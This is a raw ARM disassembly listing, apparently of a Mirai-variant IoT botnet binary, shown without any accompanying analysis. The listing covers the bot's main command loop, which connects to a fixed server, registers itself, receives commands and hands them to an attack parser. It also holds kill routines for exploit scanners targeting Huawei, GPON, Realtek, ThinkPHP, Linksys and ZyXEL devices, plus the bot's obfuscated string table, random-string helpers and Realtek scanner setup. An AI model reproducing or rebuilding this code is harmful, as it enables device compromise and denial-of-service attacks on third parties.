   12164:	e3700001 	cmn	r0, #1
   12168:	0affffbf 	beq	1206c <main+0x264>
   1216c:	e3500000 	cmp	r0, #0
   12170:	1a00000c 	bne	121a8 <main+0x3a0>
   12174:	e59de00c 	ldr	lr, [sp, #12]
   12178:	e59f3468 	ldr	r3, [pc, #1128]	; 125e8 <main+0x7e0>
   1217c:	e0c21e93 	smull	r1, r2, r3, lr
   12180:	e0422fce 	sub	r2, r2, lr, asr #31
   12184:	e1a03182 	lsl	r3, r2, #3
   12188:	e0433082 	sub	r3, r3, r2, lsl #1
   1218c:	e063200e 	rsb	r2, r3, lr
   12190:	e3520000 	cmp	r2, #0
   12194:	e28ee001 	add	lr, lr, #1
   12198:	e28d2c05 	add	r2, sp, #1280	; 0x500
   1219c:	e1c207be 	strh	r0, [r2, #126]	; 0x7e
   121a0:	e58de00c 	str	lr, [sp, #12]
   121a4:	0a000072 	beq	12374 <main+0x56c>
   121a8:	e59f3430 	ldr	r3, [pc, #1072]	; 125e0 <main+0x7d8>
   121ac:	e5930000 	ldr	r0, [r3]
   121b0:	e3700001 	cmn	r0, #1
   121b4:	0a000008 	beq	121dc <main+0x3d4>
   121b8:	e1a032a0 	lsr	r3, r0, #5
   121bc:	e1a03103 	lsl	r3, r3, #2
   121c0:	e28dcd16 	add	ip, sp, #1408	; 0x580
   121c4:	e083300c 	add	r3, r3, ip
   121c8:	e51320f0 	ldr	r2, [r3, #-240]	; 0xffffff10
   121cc:	e200101f 	and	r1, r0, #31
   121d0:	e1a02152 	asr	r2, r2, r1
   121d4:	e3120001 	tst	r2, #1
   121d8:	1a000088 	bne	12400 <main+0x5f8>
   121dc:	e59f1400 	ldr	r1, [pc, #1024]	; 125e4 <main+0x7dc>
   121e0:	e5d14000 	ldrb	r4, [r1]
   121e4:	e3540000 	cmp	r4, #0
   121e8:	0a00001f 	beq	1226c <main+0x464>
   121ec:	e59b0000 	ldr	r0, [fp]
   121f0:	e1a032a0 	lsr	r3, r0, #5
   121f4:	e28d2d16 	add	r2, sp, #1408	; 0x580
   121f8:	e1a03103 	lsl	r3, r3, #2
   121fc:	e0833002 	add	r3, r3, r2
   12200:	e5132170 	ldr	r2, [r3, #-368]	; 0xfffffe90
   12204:	e200101f 	and	r1, r0, #31
   12208:	e1a02152 	asr	r2, r2, r1
   1220c:	e59f33d0 	ldr	r3, [pc, #976]	; 125e4 <main+0x7dc>
   12210:	e3a0c000 	mov	ip, #0
   12214:	e3120001 	tst	r2, #1
   12218:	e5c3c000 	strb	ip, [r3]
   1221c:	e59f53b8 	ldr	r5, [pc, #952]	; 125dc <main+0x7d4>
   12220:	1a00005a 	bne	12390 <main+0x588>
   12224:	e3700001 	cmn	r0, #1
   12228:	1b001f04 	blne	19e40 <__GI___libc_close>
   1222c:	e3e03000 	mvn	r3, #0
   12230:	e5853000 	str	r3, [r5]
   12234:	e3a00001 	mov	r0, #1
   12238:	eb001eab 	bl	19cec <__GI_sleep>
   1223c:	eaffff8a 	b	1206c <main+0x264>
   12240:	e59bc000 	ldr	ip, [fp]
   12244:	e1a032ac 	lsr	r3, ip, #5
   12248:	e28d2d16 	add	r2, sp, #1408	; 0x580
   1224c:	e1a03103 	lsl	r3, r3, #2
   12250:	e0833002 	add	r3, r3, r2
   12254:	e51320f0 	ldr	r2, [r3, #-240]	; 0xffffff10
   12258:	e20c001f 	and	r0, ip, #31
   1225c:	e3a01001 	mov	r1, #1
   12260:	e1822011 	orr	r2, r2, r1, lsl r0
   12264:	e50320f0 	str	r2, [r3, #-240]	; 0xffffff10
   12268:	eaffffad 	b	12124 <main+0x31c>
   1226c:	e59b1000 	ldr	r1, [fp]
   12270:	e3710001 	cmn	r1, #1
   12274:	e59f8360 	ldr	r8, [pc, #864]	; 125dc <main+0x7d4>
   12278:	0affff7b 	beq	1206c <main+0x264>
   1227c:	e1a032a1 	lsr	r3, r1, #5
   12280:	e28d2d16 	add	r2, sp, #1408	; 0x580
   12284:	e1a03103 	lsl	r3, r3, #2
   12288:	e0833002 	add	r3, r3, r2
   1228c:	e51320f0 	ldr	r2, [r3, #-240]	; 0xffffff10
   12290:	e201101f 	and	r1, r1, #31
   12294:	e1a02152 	asr	r2, r2, r1
   12298:	e3120001 	tst	r2, #1
   1229c:	0affff72 	beq	1206c <main+0x264>
   122a0:	e28dad16 	add	sl, sp, #1408	; 0x580
   122a4:	e16a40b2 	strh	r4, [sl, #-2]!
   122a8:	eb00116a 	bl	16858 <__GI___errno_location>
   122ac:	e5804000 	str	r4, [r0]
   122b0:	e3a03901 	mov	r3, #16384	; 0x4000
   122b4:	e1a05000 	mov	r5, r0
   122b8:	e2833002 	add	r3, r3, #2
   122bc:	e5980000 	ldr	r0, [r8]
   122c0:	e1a0100a 	mov	r1, sl
   122c4:	e3a02002 	mov	r2, #2
   122c8:	eb00129d 	bl	16d44 <__libc_recv>
   122cc:	e3700001 	cmn	r0, #1
   122d0:	0a00007b 	beq	124c4 <main+0x6bc>
   122d4:	e3500000 	cmp	r0, #0
   122d8:	0a00007d 	beq	124d4 <main+0x6cc>
   122dc:	e28dcc05 	add	ip, sp, #1280	; 0x500
   122e0:	e1dc37be 	ldrh	r3, [ip, #126]	; 0x7e
   122e4:	e3530000 	cmp	r3, #0
   122e8:	1a000085 	bne	12504 <main+0x6fc>
   122ec:	e5980000 	ldr	r0, [r8]
   122f0:	e1a0100a 	mov	r1, sl
   122f4:	e3a02002 	mov	r2, #2
   122f8:	e2833901 	add	r3, r3, #16384	; 0x4000
   122fc:	eb001290 	bl	16d44 <__libc_recv>
   12300:	eaffff59 	b	1206c <main+0x264>
   12304:	e3a00002 	mov	r0, #2
   12308:	e3a01001 	mov	r1, #1
   1230c:	e1a02004 	mov	r2, r4
   12310:	eb00134f 	bl	17054 <__GI_socket>
   12314:	e3700001 	cmn	r0, #1
   12318:	e1a05000 	mov	r5, r0
   1231c:	e5880000 	str	r0, [r8]
   12320:	0affff71 	beq	120ec <main+0x2e4>
   12324:	e1a02004 	mov	r2, r4
   12328:	e3a01003 	mov	r1, #3
   1232c:	eb000f20 	bl	15fb4 <__GI___libc_fcntl>
   12330:	e3a01004 	mov	r1, #4
   12334:	e3802b02 	orr	r2, r0, #2048	; 0x800
   12338:	e1a00005 	mov	r0, r5
   1233c:	eb000f1c 	bl	15fb4 <__GI___libc_fcntl>
   12340:	e59fe28c 	ldr	lr, [pc, #652]	; 125d4 <main+0x7cc>
   12344:	e59e3000 	ldr	r3, [lr]
   12348:	e3530000 	cmp	r3, #0
   1234c:	11a0e00f 	movne	lr, pc
   12350:	112fff13 	bxne	r3
   12354:	e59fc288 	ldr	ip, [pc, #648]	; 125e4 <main+0x7dc>
   12358:	e3a03001 	mov	r3, #1
   1235c:	e5980000 	ldr	r0, [r8]
   12360:	e59f125c 	ldr	r1, [pc, #604]	; 125c4 <main+0x7bc>
   12364:	e3a02010 	mov	r2, #16
   12368:	e5cc3000 	strb	r3, [ip]
   1236c:	eb001213 	bl	16bc0 <__libc_connect>
   12370:	eaffff5d 	b	120ec <main+0x2e4>
   12374:	e28d1e57 	add	r1, sp, #1392	; 0x570
   12378:	e59b0000 	ldr	r0, [fp]
   1237c:	e281100e 	add	r1, r1, #14
   12380:	e3a02002 	mov	r2, #2
   12384:	e3a03901 	mov	r3, #16384	; 0x4000
   12388:	eb0012ce 	bl	16ec8 <__libc_send>
   1238c:	eaffff85 	b	121a8 <main+0x3a0>
   12390:	e3a04004 	mov	r4, #4
   12394:	e28d3e57 	add	r3, sp, #1392	; 0x570
   12398:	e2833004 	add	r3, r3, #4
   1239c:	e58dc574 	str	ip, [sp, #1396]	; 0x574
   123a0:	e3a01001 	mov	r1, #1
   123a4:	e28dce57 	add	ip, sp, #1392	; 0x570
   123a8:	e1a02004 	mov	r2, r4
   123ac:	e58dc000 	str	ip, [sp]
   123b0:	e58d4570 	str	r4, [sp, #1392]	; 0x570
   123b4:	eb00122f 	bl	16c78 <getsockopt>
   123b8:	e59d3574 	ldr	r3, [sp, #1396]	; 0x574
   123bc:	e3530000 	cmp	r3, #0
   123c0:	0a000026 	beq	12460 <main+0x658>
   123c4:	e5950000 	ldr	r0, [r5]
   123c8:	eb001e9c 	bl	19e40 <__GI___libc_close>
   123cc:	e3e03000 	mvn	r3, #0
   123d0:	e5853000 	str	r3, [r5]
   123d4:	eb000087 	bl	125f8 <rand_next>
   123d8:	e59f220c 	ldr	r2, [pc, #524]	; 125ec <main+0x7e4>
   123dc:	e083c092 	umull	ip, r3, r2, r0
   123e0:	e1a031a3 	lsr	r3, r3, #3
   123e4:	e1a02183 	lsl	r2, r3, #3
   123e8:	e1a03083 	lsl	r3, r3, #1
   123ec:	e0833002 	add	r3, r3, r2
   123f0:	e0630000 	rsb	r0, r3, r0
   123f4:	e2800001 	add	r0, r0, #1
   123f8:	eb001e3b 	bl	19cec <__GI_sleep>
   123fc:	eaffff1a 	b	1206c <main+0x264>
   12400:	e28d2e57 	add	r2, sp, #1392	; 0x570
   12404:	e3a03010 	mov	r3, #16
   12408:	e2822004 	add	r2, r2, #4
   1240c:	e28d1e55 	add	r1, sp, #1360	; 0x550
   12410:	e58d3574 	str	r3, [sp, #1396]	; 0x574
   12414:	eb0011aa 	bl	16ac4 <__libc_accept>
   12418:	eb0006bb 	bl	13f0c <scanner_kill>
   1241c:	ebfff480 	bl	f624 <huawei_kill>
   12420:	ebfff14f 	bl	e964 <gpon443_kill>
   12424:	eb00010f 	bl	12868 <realtekscanner_scanner_kill>
   12428:	eb0006c1 	bl	13f34 <thinkphp_kill>
   1242c:	ebfffabe 	bl	10f2c <linksys_scanner_kill>
   12430:	eb000b37 	bl	15114 <zyxelscanner_scanner_kill>
   12434:	ebfff772 	bl	10204 <killer_kill>
   12438:	e59de008 	ldr	lr, [sp, #8]
   1243c:	e3a01009 	mov	r1, #9
   12440:	e26e0000 	rsb	r0, lr, #0
   12444:	eb000f54 	bl	1619c <__GI_kill>
   12448:	e59f31a0 	ldr	r3, [pc, #416]	; 125f0 <main+0x7e8>
   1244c:	e5930000 	ldr	r0, [r3]
   12450:	e3500000 	cmp	r0, #0
   12454:	1a000027 	bne	124f8 <main+0x6f0>
   12458:	e3a00000 	mov	r0, #0
   1245c:	eb001aae 	bl	18f1c <__GI_exit>
   12460:	e1a00009 	mov	r0, r9
   12464:	eb0009af 	bl	14b28 <util_strlen>
   12468:	e5cd057e 	strb	r0, [sp, #1406]	; 0x57e
   1246c:	eb000a5c 	bl	14de4 <util_local_addr>
   12470:	e59fe154 	ldr	lr, [pc, #340]	; 125cc <main+0x7c4>
   12474:	e1a02004 	mov	r2, r4
   12478:	e58e0000 	str	r0, [lr]
   1247c:	e59f1170 	ldr	r1, [pc, #368]	; 125f4 <main+0x7ec>
   12480:	e3a03901 	mov	r3, #16384	; 0x4000
   12484:	e5950000 	ldr	r0, [r5]
   12488:	eb00128e 	bl	16ec8 <__libc_send>
   1248c:	e28d1e57 	add	r1, sp, #1392	; 0x570
   12490:	e3a02001 	mov	r2, #1
   12494:	e5950000 	ldr	r0, [r5]
   12498:	e281100e 	add	r1, r1, #14
   1249c:	e3a03901 	mov	r3, #16384	; 0x4000
   124a0:	eb001288 	bl	16ec8 <__libc_send>
   124a4:	e5dd257e 	ldrb	r2, [sp, #1406]	; 0x57e
   124a8:	e3520000 	cmp	r2, #0
   124ac:	0afffeee 	beq	1206c <main+0x264>
   124b0:	e5950000 	ldr	r0, [r5]
   124b4:	e1a01009 	mov	r1, r9
   124b8:	e3a03901 	mov	r3, #16384	; 0x4000
   124bc:	eb001281 	bl	16ec8 <__libc_send>
   124c0:	eafffee9 	b	1206c <main+0x264>
   124c4:	e5953000 	ldr	r3, [r5]
   124c8:	e3530004 	cmp	r3, #4
   124cc:	1353000b 	cmpne	r3, #11
   124d0:	0afffee5 	beq	1206c <main+0x264>
   124d4:	e59b0000 	ldr	r0, [fp]
   124d8:	e3700001 	cmn	r0, #1
   124dc:	1b001e57 	blne	19e40 <__GI___libc_close>
   124e0:	e59f30f4 	ldr	r3, [pc, #244]	; 125dc <main+0x7d4>
   124e4:	e3e02000 	mvn	r2, #0
   124e8:	e5832000 	str	r2, [r3]
   124ec:	e3a00001 	mov	r0, #1
   124f0:	eb001dfd 	bl	19cec <__GI_sleep>
   124f4:	eafffedc 	b	1206c <main+0x264>
   124f8:	e3a01009 	mov	r1, #9
   124fc:	eb000f26 	bl	1619c <__GI_kill>
   12500:	eaffffd4 	b	12458 <main+0x650>
   12504:	e1a02423 	lsr	r2, r3, #8
   12508:	e20330ff 	and	r3, r3, #255	; 0xff
   1250c:	e1822403 	orr	r2, r2, r3, lsl #8
   12510:	e28dec05 	add	lr, sp, #1280	; 0x500
   12514:	e3520b01 	cmp	r2, #1024	; 0x400
   12518:	e1ce27be 	strh	r2, [lr, #126]	; 0x7e
   1251c:	9a000004 	bls	12534 <main+0x72c>
   12520:	e5980000 	ldr	r0, [r8]
   12524:	eb001e45 	bl	19e40 <__GI___libc_close>
   12528:	e3e03000 	mvn	r3, #0
   1252c:	e5883000 	str	r3, [r8]
   12530:	eafffecd 	b	1206c <main+0x264>
   12534:	e5854000 	str	r4, [r5]
   12538:	e3a03901 	mov	r3, #16384	; 0x4000
   1253c:	e28d4010 	add	r4, sp, #16
   12540:	e2833002 	add	r3, r3, #2
   12544:	e5980000 	ldr	r0, [r8]
   12548:	e1a01004 	mov	r1, r4
   1254c:	eb0011fc 	bl	16d44 <__libc_recv>
   12550:	e3700001 	cmn	r0, #1
   12554:	0affffda 	beq	124c4 <main+0x6bc>
   12558:	e3500000 	cmp	r0, #0
   1255c:	0affffdc 	beq	124d4 <main+0x6cc>
   12560:	e1a0100a 	mov	r1, sl
   12564:	e3a02002 	mov	r2, #2
   12568:	e3a03901 	mov	r3, #16384	; 0x4000
   1256c:	e5980000 	ldr	r0, [r8]
   12570:	eb0011f3 	bl	16d44 <__libc_recv>
   12574:	e28d1c05 	add	r1, sp, #1280	; 0x500
   12578:	e1d137be 	ldrh	r3, [r1, #126]	; 0x7e
   1257c:	e1a0c423 	lsr	ip, r3, #8
   12580:	e20330ff 	and	r3, r3, #255	; 0xff
   12584:	e18cc403 	orr	ip, ip, r3, lsl #8
   12588:	e28dec05 	add	lr, sp, #1280	; 0x500
   1258c:	e1a0200c 	mov	r2, ip
   12590:	e1a01004 	mov	r1, r4
   12594:	e5980000 	ldr	r0, [r8]
   12598:	e3a03901 	mov	r3, #16384	; 0x4000
   1259c:	e1cec7be 	strh	ip, [lr, #126]	; 0x7e
   125a0:	eb0011e7 	bl	16d44 <__libc_recv>
   125a4:	e28d2c05 	add	r2, sp, #1280	; 0x500
   125a8:	e1d217be 	ldrh	r1, [r2, #126]	; 0x7e
   125ac:	e3510000 	cmp	r1, #0
   125b0:	0afffead 	beq	1206c <main+0x264>
   125b4:	e1a00004 	mov	r0, r4
   125b8:	ebffdebe 	bl	a0b8 <attack_parse>
   125bc:	eafffeaa 	b	1206c <main+0x264>
   125c0:	00011abc 	.word	0x00011abc
   125c4:	0002b8bc 	.word	0x0002b8bc
   125c8:	f5603a2b 	.word	0xf5603a2b
   125cc:	0002b8ac 	.word	0x0002b8ac
   125d0:	00011ad4 	.word	0x00011ad4
   125d4:	00028a70 	.word	0x00028a70
   125d8:	0002033c 	.word	0x0002033c
   125dc:	00028a6c 	.word	0x00028a6c
   125e0:	00028a68 	.word	0x00028a68
   125e4:	00028d34 	.word	0x00028d34
   125e8:	2aaaaaab 	.word	0x2aaaaaab
   125ec:	cccccccd 	.word	0xcccccccd
   125f0:	00028d30 	.word	0x00028d30
   125f4:	0001f8d4 	.word	0x0001f8d4

000125f8 <rand_next>:
   125f8:	e92d4070 	push	{r4, r5, r6, lr}
   125fc:	e59f5040 	ldr	r5, [pc, #64]	; 12644 <rand_next+0x4c>
   12600:	e59f6040 	ldr	r6, [pc, #64]	; 12648 <rand_next+0x50>
   12604:	e5953000 	ldr	r3, [r5]
   12608:	e5962000 	ldr	r2, [r6]
   1260c:	e59fe038 	ldr	lr, [pc, #56]	; 1264c <rand_next+0x54>
   12610:	e59f4038 	ldr	r4, [pc, #56]	; 12650 <rand_next+0x58>
   12614:	e0233583 	eor	r3, r3, r3, lsl #11
   12618:	e02209a2 	eor	r0, r2, r2, lsr #19
   1261c:	e59e1000 	ldr	r1, [lr]
   12620:	e594c000 	ldr	ip, [r4]
   12624:	e0200003 	eor	r0, r0, r3
   12628:	e0200423 	eor	r0, r0, r3, lsr #8
   1262c:	e5851000 	str	r1, [r5]
   12630:	e58ec000 	str	ip, [lr]
   12634:	e5842000 	str	r2, [r4]
   12638:	e5860000 	str	r0, [r6]
   1263c:	e8bd4070 	pop	{r4, r5, r6, lr}
   12640:	e12fff1e 	bx	lr
   12644:	00028d38 	.word	0x00028d38
   12648:	00028d44 	.word	0x00028d44
   1264c:	00028d3c 	.word	0x00028d3c
   12650:	00028d40 	.word	0x00028d40

00012654 <rand_init>:
   12654:	e92d4030 	push	{r4, r5, lr}
   12658:	e3a00000 	mov	r0, #0
   1265c:	e24dd004 	sub	sp, sp, #4
   12660:	eb000f61 	bl	163ec <__GI_time>
   12664:	e59f3040 	ldr	r3, [pc, #64]	; 126ac <rand_init+0x58>
   12668:	e5830000 	str	r0, [r3]
   1266c:	eb001d50 	bl	19bb4 <__getpid>
   12670:	e1a04000 	mov	r4, r0
   12674:	eb000e8b 	bl	160a8 <getppid>
   12678:	e59f5030 	ldr	r5, [pc, #48]	; 126b0 <rand_init+0x5c>
   1267c:	e0200004 	eor	r0, r0, r4
   12680:	e5850000 	str	r0, [r5]
   12684:	eb00107b 	bl	16878 <clock>
   12688:	e5953000 	ldr	r3, [r5]
   1268c:	e59f2020 	ldr	r2, [pc, #32]	; 126b4 <rand_init+0x60>
   12690:	e59f1020 	ldr	r1, [pc, #32]	; 126b8 <rand_init+0x64>
   12694:	e0203003 	eor	r3, r0, r3
   12698:	e5823000 	str	r3, [r2]
   1269c:	e5810000 	str	r0, [r1]
   126a0:	e28dd004 	add	sp, sp, #4
   126a4:	e8bd4030 	pop	{r4, r5, lr}
   126a8:	e12fff1e 	bx	lr
   126ac:	00028d38 	.word	0x00028d38
   126b0:	00028d3c 	.word	0x00028d3c
   126b4:	00028d44 	.word	0x00028d44
   126b8:	00028d40 	.word	0x00028d40

000126bc <rand_alpha_str>:
   126bc:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   126c0:	e1a0b000 	mov	fp, r0
   126c4:	e24dd044 	sub	sp, sp, #68	; 0x44
   126c8:	e3a0001a 	mov	r0, #26
   126cc:	e1a09001 	mov	r9, r1
   126d0:	eb000392 	bl	13520 <table_unlock_val>
   126d4:	e3a01000 	mov	r1, #0
   126d8:	e3a0001a 	mov	r0, #26
   126dc:	eb00035e 	bl	1345c <table_retrieve_val>
   126e0:	e1a01000 	mov	r1, r0
   126e4:	e1a0000d 	mov	r0, sp
   126e8:	eb0010b8 	bl	169d0 <__GI_strcpy>
   126ec:	e3590000 	cmp	r9, #0
   126f0:	0a00001c 	beq	12768 <rand_alpha_str+0xac>
   126f4:	e59fa080 	ldr	sl, [pc, #128]	; 1277c <rand_alpha_str+0xc0>
   126f8:	e59f8080 	ldr	r8, [pc, #128]	; 12780 <rand_alpha_str+0xc4>
   126fc:	e59f7080 	ldr	r7, [pc, #128]	; 12784 <rand_alpha_str+0xc8>
   12700:	e59f6080 	ldr	r6, [pc, #128]	; 12788 <rand_alpha_str+0xcc>
   12704:	e3a05000 	mov	r5, #0
   12708:	e5962000 	ldr	r2, [r6]
   1270c:	e59a3000 	ldr	r3, [sl]
   12710:	e02249a2 	eor	r4, r2, r2, lsr #19
   12714:	e0233583 	eor	r3, r3, r3, lsl #11
   12718:	e0244003 	eor	r4, r4, r3
   1271c:	e5981000 	ldr	r1, [r8]
   12720:	e597c000 	ldr	ip, [r7]
   12724:	e0244423 	eor	r4, r4, r3, lsr #8
   12728:	e1a0000d 	mov	r0, sp
   1272c:	e58a1000 	str	r1, [sl]
   12730:	e588c000 	str	ip, [r8]
   12734:	e5872000 	str	r2, [r7]
   12738:	e5864000 	str	r4, [r6]
   1273c:	eb0008f9 	bl	14b28 <util_strlen>
   12740:	e1a01000 	mov	r1, r0
   12744:	e1a00004 	mov	r0, r4
   12748:	eb000d97 	bl	15dac <__aeabi_uidivmod>
   1274c:	e28d3040 	add	r3, sp, #64	; 0x40
   12750:	e0831001 	add	r1, r3, r1
   12754:	e5513040 	ldrb	r3, [r1, #-64]	; 0xffffffc0
   12758:	e7c5300b 	strb	r3, [r5, fp]
   1275c:	e2855001 	add	r5, r5, #1
   12760:	e1550009 	cmp	r5, r9
   12764:	1affffe7 	bne	12708 <rand_alpha_str+0x4c>
   12768:	e3a0001a 	mov	r0, #26
   1276c:	eb000343 	bl	13480 <table_lock_val>
   12770:	e28dd044 	add	sp, sp, #68	; 0x44
   12774:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   12778:	e12fff1e 	bx	lr
   1277c:	00028d38 	.word	0x00028d38
   12780:	00028d3c 	.word	0x00028d3c
   12784:	00028d40 	.word	0x00028d40
   12788:	00028d44 	.word	0x00028d44

0001278c <rand_str>:
   1278c:	e3510000 	cmp	r1, #0
   12790:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   12794:	e1a05000 	mov	r5, r0
   12798:	da000027 	ble	1283c <rand_str+0xb0>
   1279c:	e59fa0b4 	ldr	sl, [pc, #180]	; 12858 <rand_str+0xcc>
   127a0:	e59f80b4 	ldr	r8, [pc, #180]	; 1285c <rand_str+0xd0>
   127a4:	e59f70b4 	ldr	r7, [pc, #180]	; 12860 <rand_str+0xd4>
   127a8:	e59f60b4 	ldr	r6, [pc, #180]	; 12864 <rand_str+0xd8>
   127ac:	e59ae000 	ldr	lr, [sl]
   127b0:	e5984000 	ldr	r4, [r8]
   127b4:	e5970000 	ldr	r0, [r7]
   127b8:	e596c000 	ldr	ip, [r6]
   127bc:	ea000006 	b	127dc <rand_str+0x50>
   127c0:	e0c530b2 	strh	r3, [r5], #2
   127c4:	e3510000 	cmp	r1, #0
   127c8:	e1a0c000 	mov	ip, r0
   127cc:	da00001c 	ble	12844 <rand_str+0xb8>
   127d0:	e1a00004 	mov	r0, r4
   127d4:	e1a0400e 	mov	r4, lr
   127d8:	e1a0e003 	mov	lr, r3
   127dc:	e02c258c 	eor	r2, ip, ip, lsl #11
   127e0:	e02e39ae 	eor	r3, lr, lr, lsr #19
   127e4:	e0233002 	eor	r3, r3, r2
   127e8:	e3510003 	cmp	r1, #3
   127ec:	e0233422 	eor	r3, r3, r2, lsr #8
   127f0:	c4853004 	strgt	r3, [r5], #4
   127f4:	c2411004 	subgt	r1, r1, #4
   127f8:	cafffff1 	bgt	127c4 <rand_str+0x38>
   127fc:	e02c258c 	eor	r2, ip, ip, lsl #11
   12800:	e02e39ae 	eor	r3, lr, lr, lsr #19
   12804:	e0233002 	eor	r3, r3, r2
   12808:	e3510001 	cmp	r1, #1
   1280c:	e0233422 	eor	r3, r3, r2, lsr #8
   12810:	e2411002 	sub	r1, r1, #2
   12814:	1affffe9 	bne	127c0 <rand_str+0x34>
   12818:	e02c258c 	eor	r2, ip, ip, lsl #11
   1281c:	e02e39ae 	eor	r3, lr, lr, lsr #19
   12820:	e0233002 	eor	r3, r3, r2
   12824:	e0233422 	eor	r3, r3, r2, lsr #8
   12828:	e5860000 	str	r0, [r6]
   1282c:	e5874000 	str	r4, [r7]
   12830:	e588e000 	str	lr, [r8]
   12834:	e58a3000 	str	r3, [sl]
   12838:	e5c53000 	strb	r3, [r5]
   1283c:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   12840:	e12fff1e 	bx	lr
   12844:	e58a3000 	str	r3, [sl]
   12848:	e588e000 	str	lr, [r8]
   1284c:	e5874000 	str	r4, [r7]
   12850:	e5860000 	str	r0, [r6]
   12854:	eafffff8 	b	1283c <rand_str+0xb0>
   12858:	00028d44 	.word	0x00028d44
   1285c:	00028d40 	.word	0x00028d40
   12860:	00028d3c 	.word	0x00028d3c
   12864:	00028d38 	.word	0x00028d38

00012868 <realtekscanner_scanner_kill>:
   12868:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
   1286c:	e59f3018 	ldr	r3, [pc, #24]	; 1288c <realtekscanner_scanner_kill+0x24>
   12870:	e24dd004 	sub	sp, sp, #4
   12874:	e5930000 	ldr	r0, [r3]
   12878:	e3a01009 	mov	r1, #9
   1287c:	eb000e46 	bl	1619c <__GI_kill>
   12880:	e28dd004 	add	sp, sp, #4
   12884:	e49de004 	pop	{lr}		; (ldr lr, [sp], #4)
   12888:	e12fff1e 	bx	lr
   1288c:	00028d48 	.word	0x00028d48

00012890 <realtekscanner_setup_connection>:
   12890:	e92d4070 	push	{r4, r5, r6, lr}
   12894:	e1a05000 	mov	r5, r0
   12898:	e5900000 	ldr	r0, [r0]
   1289c:	e24dd010 	sub	sp, sp, #16
   128a0:	e3a06000 	mov	r6, #0
   128a4:	e3700001 	cmn	r0, #1
   128a8:	e58d6000 	str	r6, [sp]
   128ac:	e58d6004 	str	r6, [sp, #4]
   128b0:	e58d6008 	str	r6, [sp, #8]
   128b4:	e58d600c 	str	r6, [sp, #12]
   128b8:	1b001d60 	blne	19e40 <__GI___libc_close>
   128bc:	e3a00002 	mov	r0, #2
   128c0:	e3a01001 	mov	r1, #1
   128c4:	e1a02006 	mov	r2, r6
   128c8:	eb0011e1 	bl	17054 <__GI_socket>
   128cc:	e3700001 	cmn	r0, #1
   128d0:	e5850000 	str	r0, [r5]
   128d4:	0a00001e 	beq	12954 <realtekscanner_setup_connection+0xc4>
   128d8:	e2850018 	add	r0, r5, #24
   128dc:	e3a01c01 	mov	r1, #256	; 0x100
   128e0:	e5856014 	str	r6, [r5, #20]
   128e4:	eb0008b4 	bl	14bbc <util_zero>
   128e8:	e5954000 	ldr	r4, [r5]
   128ec:	e1a02006 	mov	r2, r6
   128f0:	e3a01003 	mov	r1, #3
   128f4:	e1a00004 	mov	r0, r4
   128f8:	eb000dad 	bl	15fb4 <__GI___libc_fcntl>
   128fc:	e3a01004 	mov	r1, #4
   12900:	e3802b02 	orr	r2, r0, #2048	; 0x800
   12904:	e1a00004 	mov	r0, r4
   12908:	eb000da9 	bl	15fb4 <__GI___libc_fcntl>
   1290c:	e59f304c 	ldr	r3, [pc, #76]	; 12960 <realtekscanner_setup_connection+0xd0>
   12910:	e5931000 	ldr	r1, [r3]
   12914:	e595300c 	ldr	r3, [r5, #12]
   12918:	e58d3004 	str	r3, [sp, #4]
   1291c:	e3a03002 	mov	r3, #2
   12920:	e5952008 	ldr	r2, [r5, #8]
   12924:	e1cd30b0 	strh	r3, [sp]
   12928:	e2422002 	sub	r2, r2, #2
   1292c:	e1d531b0 	ldrh	r3, [r5, #16]
   12930:	e3520001 	cmp	r2, #1
   12934:	e1cd30b2 	strh	r3, [sp, #2]
   12938:	83a03001 	movhi	r3, #1
   1293c:	e5851004 	str	r1, [r5, #4]
   12940:	85853008 	strhi	r3, [r5, #8]
   12944:	e5950000 	ldr	r0, [r5]
   12948:	e1a0100d 	mov	r1, sp
   1294c:	e3a02010 	mov	r2, #16
   12950:	eb00109a 	bl	16bc0 <__libc_connect>
   12954:	e28dd010 	add	sp, sp, #16
   12958:	e8bd4070 	pop	{r4, r5, r6, lr}
   1295c:	e12fff1e 	bx	lr
   12960:	00028d78 	.word	0x00028d78

00012964 <realtekscanner_scanner_init>:
   12964:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   12968:	e24dde72 	sub	sp, sp, #1824	; 0x720
   1296c:	e3a03000 	mov	r3, #0
   12970:	e24dd00c 	sub	sp, sp, #12
   12974:	e58d3724 	str	r3, [sp, #1828]	; 0x724
   12978:	eb001b74 	bl	19750 <__libc_fork>
   1297c:	e3700001 	cmn	r0, #1
   12980:	13a03000 	movne	r3, #0
   12984:	03a03001 	moveq	r3, #1
   12988:	e3500000 	cmp	r0, #0
   1298c:	d1a04003 	movle	r4, r3
   12990:	c3834001 	orrgt	r4, r3, #1
   12994:	e59f3aa0 	ldr	r3, [pc, #2720]	; 1343c <realtekscanner_scanner_init+0xad8>
   12998:	e3540000 	cmp	r4, #0
   1299c:	e5830000 	str	r0, [r3]
   129a0:	0a000003 	beq	129b4 <realtekscanner_scanner_init+0x50>
   129a4:	e28ddfcb 	add	sp, sp, #812	; 0x32c
   129a8:	e28ddb01 	add	sp, sp, #1024	; 0x400
   129ac:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
   129b0:	e12fff1e 	bx	lr
   129b4:	eb00090a 	bl	14de4 <util_local_addr>
   129b8:	e59f1a80 	ldr	r1, [pc, #2688]	; 13440 <realtekscanner_scanner_init+0xadc>
   129bc:	e5810000 	str	r0, [r1]
   129c0:	ebffff23 	bl	12654 <rand_init>
   129c4:	e1a00004 	mov	r0, r4
   129c8:	eb000e87 	bl	163ec <__GI_time>
   129cc:	e59f2a70 	ldr	r2, [pc, #2672]	; 13444 <realtekscanner_scanner_init+0xae0>
   129d0:	e3a01e51 	mov	r1, #1296	; 0x510
   129d4:	e5820000 	str	r0, [r2]
   129d8:	e2811008 	add	r1, r1, #8
   129dc:	e3a00080 	mov	r0, #128	; 0x80
   129e0:	eb00147d 	bl	17bdc <calloc>
   129e4:	e59f3a5c 	ldr	r3, [pc, #2652]	; 13448 <realtekscanner_scanner_init+0xae4>
   129e8:	e58d4724 	str	r4, [sp, #1828]	; 0x724
   129ec:	e5830000 	str	r0, [r3]
   129f0:	e1a0e004 	mov	lr, r4
   129f4:	e1a0228e 	lsl	r2, lr, #5
